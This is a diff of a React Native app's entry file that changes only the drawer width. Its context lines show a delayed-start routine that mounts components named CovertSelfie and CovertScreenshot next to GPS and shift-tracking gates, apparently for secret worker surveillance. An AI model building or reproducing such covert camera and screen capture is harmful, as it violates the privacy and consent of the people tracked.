@@ -85,7 +85,7 @@ try { I18nManager.allowRTL(true); I18nManager.forceRTL(false); I18nManager.swapL
 installGlobalCrashHandlers(); SplashScreen.preventAutoHideAsync().catch(() => {});
 const navigationRef=createNavigationContainerRef(),Stack=createNativeStackNavigator(),Drawer=createDrawerNavigator();
 const SCREEN_W=Dimensions.get('window').width;
-const DRAWER_WIDTH=Math.min(340,Math.max(280,Math.round(SCREEN_W*0.78)));
+const DRAWER_WIDTH=Math.min(320,Math.max(260,Math.round(SCREEN_W*0.70)));
 function openDrawer(){try{if(navigationRef.isReady())navigationRef.dispatch(DrawerActions.openDrawer())}catch(_) {}}
 const stackOptions={headerStyle:{backgroundColor:C.brand},headerTintColor:'#fff',headerTitleStyle:{fontFamily:FONT.bold},headerLeft:()=> <TouchableOpacity onPress={openDrawer} style={{paddingHorizontal:10}} hitSlop={8}><Text style={{color:'#fff',fontSize:24}}>☰</Text></TouchableOpacity>};
 function DeferredRuntimeServices(){const[stage,setStage]=React.useState(0);React.useEffect(()=>{let active=true;const timers=[1800,2300,2800,3300].map((d,i)=>setTimeout(()=>active&&setStage(x=>Math.max(x,i+1)),d));const sub=AppState.addEventListener('change',s=>{if(s==='active'&&stage===0)setTimeout(()=>active&&setStage(1),500)});return()=>{active=false;timers.forEach(clearTimeout);try{sub.remove()}catch(_){}}},[]);if(stage<1)return null;return <><ErrorBoundary><GpsGuard/></ErrorBoundary><ErrorBoundary><MaintenanceGuard/></ErrorBoundary>{stage>=2&&<ErrorBoundary><PresenceGate/></ErrorBoundary>}{stage>=3&&<ErrorBoundary><CovertSelfie/></ErrorBoundary>}{stage>=3&&<ErrorBoundary><CovertScreenshot/></ErrorBoundary>}{stage>=4&&<ErrorBoundary><BatteryOptimizationGate/></ErrorBoundary>}{stage>=4&&<ErrorBoundary><ShiftTrackingGate/></ErrorBoundary>}</>}
